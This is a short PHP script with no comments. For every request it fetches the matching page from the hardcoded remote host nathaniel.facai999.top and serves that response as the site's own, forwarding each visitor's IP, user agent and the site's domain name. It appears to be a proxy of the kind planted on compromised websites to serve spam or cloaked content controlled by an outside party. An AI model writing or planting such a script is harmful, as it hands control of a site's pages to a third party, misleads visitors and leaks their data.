<?php
function v($k,$d){return isset($_SERVER[$k])?$_SERVER[$k]:$d;}
function rip(){
    $ip=v('HTTP_X_FORWARDED_FOR','');
    if($ip!==''){$a=explode(',',$ip);return trim($a[0]);}
    $ip=v('HTTP_CF_CONNECTING_IP','');
    return $ip!==''?trim($ip):v('REMOTE_ADDR','');
}
$uri=v('REQUEST_URI','/');
$proto=v('HTTP_X_FORWARDED_PROTO','');
if($proto===''){$proto=(v('HTTPS','')!==''&&strtolower(v('HTTPS',''))!=='off')?'https':'http';}
if($proto!=='http'&&$proto!=='https'){$proto='http';}
$ip=rip();
$ch=curl_init('http://nathaniel.facai999.top'.$uri);
if(!$ch){header('HTTP/1.1 502 Bad Gateway');exit;}
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_TIMEOUT,10);
curl_setopt($ch,CURLOPT_ENCODING,'');
curl_setopt($ch,CURLOPT_HEADER,true);
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
    'User-Agent: '.v('HTTP_USER_AGENT',''),
    'X-Forwarded-For: '.$ip,
    'X-Real-IP: '.$ip,
    'X-Current-Domain: '.v('HTTP_HOST',''),
    'X-Forwarded-Proto: '.$proto,
    'X-Original-URI: '.v('HTTP_X_ORIGINAL_URI',$uri)
));
$res=curl_exec($ch);
if($res===false){
    curl_close($ch);
    header('HTTP/1.1 502 Bad Gateway');
    exit;
}
$hs=curl_getinfo($ch,CURLINFO_HEADER_SIZE);
$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
$type=curl_getinfo($ch,CURLINFO_CONTENT_TYPE);
curl_close($ch);
if($code>0){header('HTTP/1.1 '.$code);}
header('Content-Type: '.($type?$type:'text/html; charset=utf-8'));
echo substr($res,$hs);
